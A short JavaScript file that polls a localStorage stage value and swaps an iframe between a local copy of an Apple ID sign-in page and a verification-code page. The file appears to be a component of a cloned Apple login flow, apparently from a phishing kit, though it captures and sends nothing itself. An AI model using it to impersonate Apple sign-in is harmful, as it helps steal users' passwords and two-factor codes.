$("#landing--transition").addClass("landing--sign-in")
localStorage.setItem("authorizationStage", "first");

setInterval(checkStageUpdate, 500);

let previousStage;

function checkStageUpdate() {
    console.log("check");
    let stage = localStorage.getItem("authorizationStage");
    if (previousStage !== stage) {
        previousStage = stage;

        //First stage
        if (stage === "first") {

            $("#landing--transition").removeClass("landing--first-factor-authentication-success")
            $("iframe").attr("src", "./appleID_files/signin.html")

        } else if (stage === "second") {//Second stage

            $("#landing--transition").addClass("landing--first-factor-authentication-success")
            $("iframe").attr("src", "./appleID_files/code.html")
        }
    }
}